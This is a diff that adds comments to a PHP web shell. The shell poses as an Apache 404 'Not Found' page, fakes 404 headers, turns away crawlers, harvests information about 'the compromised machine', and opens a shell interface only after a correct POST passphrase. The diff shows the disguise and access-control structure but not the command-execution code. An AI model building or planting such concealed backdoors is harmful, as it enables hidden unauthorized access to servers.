@@ -21,6 +21,9 @@
 
 		// - Apache -
 
+	/**
+	 *	Show the 404 Apache page
+	 */
 	function ApacheNotFound()
 	{
 		ApacheNotFound_Head();
@@ -28,6 +31,9 @@
 		exit(0);
 	}
 
+	/**
+	 *	Apache stylesheet template
+	 */
 	function ApacheNotFound_Head()
 	{
 ?>		
@@ -51,6 +57,9 @@
 <?php
 	}
 
+	/**
+	 *	Apache HTML template
+	 */
 	function ApacheNotFound_Body()
 	{
 ?>		
@@ -72,12 +81,18 @@
 
 		// - Shell -
 
+	/**
+	 *	Show the Shell
+	 */
 	function Shell()
 	{
 		ShellHead();
 		ShellNavbar();
 	}
 
+	/**
+	 *	Shell stylesheet template
+	 */
 	function ShellHead()
 	{
 ?>
@@ -174,6 +189,9 @@
 <?php
 	}
 
+	/**
+	 *	Shell navbar HTML template
+	 */
 	function ShellNavbar()
 	{
 ?>
@@ -193,12 +211,19 @@
 
 	// ---- FUNCTIONS ----
 	
+	/**
+	 *	Set the 404 most common headers
+	 *	Easter Egg: X-Powered-By
+	 */
 	function SetHeaders()
 	{
 		header('HTTP/1.0 404 Not Found');
 		header('X-Powered-By: Unicorns and kitties <3');
 	}
 
+	/**
+	 *	Avoid the most common robots / crawlers
+	 */
 	function FightRobots()
 	{
 		global $robots;
@@ -211,6 +236,9 @@
 		}
 	}
 
+	/**
+	 *	Harvest information about the compromised machine
+	 */
 	function GatherInformation()
 	{
 		$info = array(
@@ -221,11 +249,19 @@
 		$GLOBALS['INFO'] = $info;
 	}
 
+	/**
+	 *	Reload the current page without parameters
+	 */
 	function ReloadPage()
 	{
 		header("Location: " . explode("?", $_SERVER[REQUEST_URI])[0], true, 302);
 	}
 
+	/**
+	 *	Check if the specified passwd (POST) is set nor matchs the current passphrase
+	 * 		True => New session
+	 * 		False => Apache 404 Page
+	 */
 	function CheckPasswd()
 	{
 		global $passphrase;
@@ -240,6 +276,9 @@
 		}
 	}
 
+	/**
+	 *	Destroy the current session
+	 */
 	function ClearSession()
 	{
 		unset($_SESSION[md5($_SERVER['REMOTE_ADDR'])]);
